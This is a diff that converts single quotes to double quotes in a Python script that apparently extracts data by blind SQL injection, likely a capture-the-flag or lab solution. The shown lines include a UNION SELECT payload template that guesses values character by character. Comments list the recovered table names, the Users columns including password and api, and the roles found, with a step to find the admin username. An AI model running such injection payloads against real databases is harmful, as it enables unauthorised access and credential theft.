@@ -36,7 +36,7 @@ def crack(query, charset):
             answer = t
 
         if not found:
-            answer = ''.join(answer_arr)
+            answer = "".join(answer_arr)
             print(
                 f"Index {i}; Not found in chartset; Found {answer} so far"
             )
@@ -53,8 +53,8 @@ def crack_all(col, loc, charset, answers=[]):
             "union select NULL,NULL,{col} from {loc} having length({col})>={{index}} and substr({col},1,{{index}})=BINARY '{{answer}}' {filter} limit 1 --+".format(
                 col=col,
                 loc=loc,
-                filter=('and 'if len(answers) else '') +
-                ' and '.join([f'{col}<>\'{a}\'' for a in answers])
+                filter=("and "if len(answers) else "") +
+                " and ".join([f"{col}<>'{a}'" for a in answers])
             ),
             charset
         )
@@ -83,7 +83,7 @@ def main():
     #     "information_schema.tables where table_schema='Secure'",
     #     charset
     # )
-    # secure_tables = ['testing', 'Trainings', 'Users']
+    # secure_tables = ["testing", "Trainings", "Users"]
 
     # find columns in testing table
     # testing_cols = crack_all(
@@ -91,7 +91,7 @@ def main():
     #     "information_schema.columns where table_name='testing'",
     #     charset
     # )
-    # testing_cols = ['id', 'msg']
+    # testing_cols = ["id", "msg"]
 
     # count rows in testing table: 0
     # testing_nrows = len(
@@ -126,7 +126,7 @@ def main():
     #     "information_schema.columns where table_name='Users'",
     #     charset
     # )
-    # users_cols = ['api', 'id', 'password', 'probation', 'roles', 'username', 'website']
+    # users_cols = ["api", "id", "password", "probation", "roles", "username", "website"]
 
     # 6. count number of distinct roles: 2
     # n_roles = len(
@@ -143,7 +143,7 @@ def main():
     #     "Users",
     #     charset
     # )
-    # roles = ['user', 'HR admin']
+    # roles = ["user", "HR admin"]
 
     # 8. find admin username
     # admin = crack(
